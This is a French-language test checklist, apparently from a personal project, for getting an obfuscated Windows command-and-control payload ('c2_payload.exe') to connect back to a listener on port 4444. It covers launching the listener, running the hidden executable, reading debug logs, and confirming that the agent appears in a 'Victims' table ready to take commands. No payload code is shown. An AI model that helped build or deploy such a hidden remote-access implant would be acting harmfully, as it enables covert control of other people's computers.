# ✅ Windows Test Checklist - Post-Fix

## 📋 Prérequis

- [ ] Windows VM (ou machine Windows réelle)
- [ ] Python 3.11+ installé
- [ ] Artifact `c2_payload.exe` téléchargé depuis GitHub Actions
- [ ] Serveur C2 en écoute (`python src/main.py`)

---

## 🚀 Étape 1: Démarrer le Listener C2

**Sur ta machine macOS:**

```bash
cd /Users/kalilbelgoumri/Desktop/pupy-c2-manager-macos
python src/main.py
```

Tu devrais voir la GUI PyQt5 s'ouvrir. Va dans l'onglet **"Client"** et clique sur **"Start Listener"**

Vérifie:
- [ ] Port 4444 est en écoute
- [ ] Message "Listener started on 0.0.0.0:4444" apparaît

---

## 🧪 Étape 2: Lancer l'Exe sur Windows

**Sur ta machine Windows (VM ou réelle):**

Ouvre PowerShell et navigue vers le dossier avec `c2_payload.exe`

### Option A: Test Silencieux (Sans Logs)
```powershell
.\c2_payload.exe
```
Attends 3-5 secondes. Si rien ne se passe = bon signe (C2 est hidden).

### Option B: Test Verbeux (Avec Debug Logs) - RECOMMANDÉ
```powershell
$env:C2_DEBUG = "1"
.\c2_payload.exe
```

Puis regarde les logs :
```powershell
cat $env:TEMP\c2_wrapper.log
cat $env:TEMP\c2_debug.log
```

---

## 📊 Résultats Attendus

### ✅ SUCCESS
```
Logs dans c2_debug.log:
14:23:45 - Attempting connection to 192.168.1.40:4444
14:23:46 - Connection successful!

Et dans la GUI "Client" tab:
[*] New client connected: 7d8e9f0a1b2c3d4e
[*] OS: Windows 11 | User: Admin | IP: 192.168.1.105
```

### ❌ STILL FAILING?
Si tu vois encore :
```
ModuleNotFoundError: No module named 'platform'
```

Alors fais un rapport exact:
1. Copie tout le contenu de `c2_debug.log`
2. Copie tout le contenu de `c2_wrapper.log`
3. Note l'obfuscation level utilisé
4. Envoie-moi les logs

---

## 🔍 Diagnostic Steps

### Si l'exe crash immédiatement
```powershell
# Teste d'abord Python tout seul
python --version  # Doit être 3.11+

# Essaye de décoder un simple base64
python -c "import base64; print(base64.b64decode('aGk=').decode())"  # Doit afficher "hi"

# Essaye d'importer platform
python -c "import platform; print(platform.node())"  # Doit afficher le hostname
```

### Si rien ne s'affiche dans la GUI
```powershell
# L'exe se lance mais ne se connecte pas

# Vérifie que le listener est bien à l'écoute
netstat -an | findstr :4444

# Ou depuis macOS:
lsof -i :4444
```

---

## 📸 Screenshots ou Proof

Une fois que ça marche, prends:
1. Screenshot de la GUI "Client" tab avec l'agent connecté
2. Screenshot des logs Windows (c2_debug.log)
3. Envoie-moi ça en proof que c'est fixé!

---

## 🎯 Target Outcome

Après ce test, tu devrais voir:
- ✅ Exe se lance sans crash
- ✅ Logs montrent "Connection successful"
- ✅ Agent apparaît dans la table "Victims"
- ✅ Tu peux envoyer des commandes

**Si tu vois ça = TON PROJET FONCTIONNE!** 🎉

---

## 💬 Si Problème

Envoie-moi:
1. Les logs complets (`c2_debug.log`, `c2_wrapper.log`)
2. L'output exact de l'erreur
3. La version de Python utilisée
4. Le système d'exploitation (Windows 10/11, x64/x86)

Je vais investiguer plus avant!
